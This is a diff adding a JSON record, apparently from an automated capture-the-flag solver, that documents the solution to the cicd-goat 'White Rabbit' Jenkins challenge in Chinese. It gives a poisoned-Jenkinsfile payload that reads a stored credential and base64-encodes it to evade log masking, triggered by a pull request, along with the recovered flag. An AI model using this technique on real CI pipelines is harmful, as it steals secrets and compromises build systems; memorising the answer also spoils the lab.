@@ -1,0 +1,14 @@
+[
+  {
+    "id": "auto-20261030211542",
+    "context": "cicd-goat White Rabbit关(CTFd id=1)。thealice对Wonderland/white-rabbit有push但main受保护需approval。Jenkins job wonderland-white-rabbit只对PR/buildable分支触发构建。攻击:推pwn分支改Jenkinsfile用withCredentials读credentialsId=flag1,发PR#1,Jenkins自动build PR(PR-1 job)执行恶意Jenkinsfile。直接echo被credential掩码成****,用 sh 'echo $F1 | base64' 绕掩码拿flag。",
+    "reference_payload": "push 分支 pwn 改 Jenkinsfile: withCredentials([string(credentialsId:'flag1',variable:'F1')]){ sh 'echo $F1 | base64' }; POST /repos/Wonderland/white-rabbit/pulls (head=pwn,base=main); Jenkins scan -> build PR-1 -> console base64 解码 = flag1",
+    "principle": "CI 的 Jenkinsfile 来自可推送的分支/PR，攻击者改 Jenkinsfile 用 withCredentials 绑定 Jenkins credential store 的 secret；Jenkins 自动对 PR 构建执行恶意 pipeline，credential 绑定到环境变量后 echo 被掩码，改用 base64 编码输出绕过掩码窃取 secret。",
+    "source": "cicd-goat",
+    "evidence": {
+      "url": "http://localhost:8080/job/wonderland-white-rabbit/job/PR-1/2/consoleText",
+      "verify": "echo",
+      "match": "+ base64 后输出 base64 串，解码得 06165DF2-C047-4402-8CAB-1C8EC526C115，CTFd 返回 correct"
+    }
+  }
+]
